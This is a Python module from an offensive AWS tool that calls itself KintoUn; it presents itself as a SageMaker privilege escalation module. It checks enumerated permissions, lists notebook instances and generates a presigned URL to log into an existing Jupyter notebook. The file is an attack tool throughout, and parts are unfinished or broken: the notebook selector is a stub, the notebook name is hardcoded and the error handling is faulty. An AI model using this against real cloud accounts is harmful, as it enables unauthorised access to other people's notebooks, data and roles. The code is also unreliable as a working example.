import boto3
from colorama import Fore, Style

def create_client(botoconfig, session, region):
    client = session.client('sagemaker', config=botoconfig, region_name=region)
    return client

def help():
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Module Description:\n")
    print("\tThis module will attemp to abuse an existing Jupyter Notebook")
    print("\tto create a signed link to be used to login to this notebook.\n")

    print("[+] Module Functionality:\n")
    print("\tThe module will try to check if the user has permissions to list existing")
    print("\tnotebooks and create a signed url.")

    print("[+] IMPORTANT:\n")
    print("\tSometimes your user/role can have the 'sagemaker':'*' permission, or the")
    print("\tclassic '*':'*' permission. This will cause the module to not find the")
    print("\trequired permissions to run. If that is the case, you can simply instruct")
    print("\tto run anyway when prompet and all should be fine.")
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)

def check_permissions(selected_session):
    try:
        permission_results_file = "./results/{}_session_data/iam/iam_enumerate_permissions_results.json".format(selected_session)
        results_file = open(permission_results_file, "r").read()
    except:
        print(Fore.RED + "[-] No permission results found...make sure to run the 'iam_enumerate_permissions' module to enumerate permissions..." + Style.RESET_ALL)
        return False

    if "sagemaker:ListNotebookInstances" in results_file and "sagemaker:CreatePresignedNotebookInstanceUrl" in results_file in results_file:
        return True
    else:
        return False 

def check_existing_notebooks(botoconfig, session):
    region = input("Please specify a region to create the notebook: ")
    sagemaker_client = create_client(botoconfig, session, region)
    status = sagemaker_client.list_notebook_instances(
        SortBy='Name',
        NameContains='MLConfig',
        StatusEquals='InService'
    )

    if status['NotebookInstances'] == []:
        return False
    else:
        for notebook in status['NotebookInstances']:
            print(notebook)
        return status, sagemaker_client

def select_notebook(notebook_list):
    print("We need to create a menu for the user to select a notebook to create a presigned URL")

def create_presigned_url(sagemaker_client):
    try:
        signed_url = sagemaker_client.create_presigned_notebook_instance_url(
            NotebookInstanceName='MLConfig'
        )

        return signed_url

    except Exception as e:
        print(e)

        return False

def main(botoconfig, session, selected_session):
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Starting SageMaker privilege escalation module...")
    print("[+] Checking for required permissions...")

    try:
        required_permissions = check_permissions(selected_session)

        if not required_permissions:
            option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
            if not option or option.lower() == "n":
                print("[-] Exiting module...")
                return 

        print("[+] Checking for existing notebooks...")
        existing_notebooks, sagemaker_client = check_existing_notebooks(botoconfig, session)
        if existing_notebooks == []:
            print("[-] There is "+Fore.RED+"no existing notebooks..."+Style.RESET_ALL+"This module requires an existing notebook to run..."+Style.RESET_ALL)
            return False

        print("[+] Parsing existing notebooks results...")
        selected_notebook = select_notebook(existing_notebooks)
        
        print("[+] Creating pre-signed URL...")
        signed_url = create_presigned_url(sagemaker_client)
        print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)

    except Exception as e:
        print(e)

        return False